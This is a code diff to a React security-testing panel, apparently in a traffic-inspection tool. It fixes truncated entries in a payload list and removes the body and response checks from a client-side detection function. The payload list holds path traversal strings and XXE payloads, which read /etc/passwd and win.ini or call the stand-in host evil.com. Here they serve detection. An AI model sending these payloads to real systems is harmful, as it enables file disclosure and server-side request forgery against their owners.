@@ -3,6 +3,7 @@ import { useState } from "react";
 import { useAppSelector } from "../../ducks";
 import { fetchApi } from "../../utils";
 import { HTTPFlow } from "../../flow";
+import { RequestUtils } from "../../flow/utils";
 
 interface SecurityTest {
     id: string;
@@ -179,7 +180,7 @@ const securityTests: SecurityTest[] = [
             "..%5C",
             "%2e%2e%2f",
             "%2e%2e%5c",
-            "....
+            "..../",
             "....\\\\",
         ],
         severity: "high",
@@ -193,7 +194,7 @@ const securityTests: SecurityTest[] = [
         detailedDescription: "XML External Entity (XXE) injection is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.",
         category: "xxe",
         payloads: [
-            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:
+            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
             "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
             "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>",
             "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
@@ -447,10 +448,8 @@ export default function SecurityTesting() {
     const performClientSideTest = (flow: HTTPFlow, test: SecurityTest): any | null => {
         if (!flow.request) return null;
         
-        const requestText = flow.request.text || "";
         const requestHeaders = flow.request.headers || {};
-        const requestUrl = flow.request.url || "";
-        const responseText = flow.response?.text || "";
+        const requestUrl = RequestUtils.pretty_url(flow.request);
         const responseHeaders = flow.response?.headers || {};
         
         let vulnerable = false;
@@ -459,13 +458,6 @@ export default function SecurityTesting() {
         
         
         for (const payload of test.payloads) {
-            
-            if (requestText.includes(payload)) {
-                vulnerable = true;
-                foundPayloads.push(payload);
-                details.push(`Payload found in request body: ${payload}`);
-            }
-            
             
             for (const [key, value] of Object.entries(requestHeaders)) {
                 if (String(value).includes(payload)) {
@@ -480,13 +472,6 @@ export default function SecurityTesting() {
                 vulnerable = true;
                 foundPayloads.push(payload);
                 details.push(`Payload found in URL: ${payload}`);
-            }
-            
-            
-            if (responseText.includes(payload)) {
-                vulnerable = true;
-                foundPayloads.push(payload);
-                details.push(`Payload reflected in response: ${payload}`);
             }
         }
         
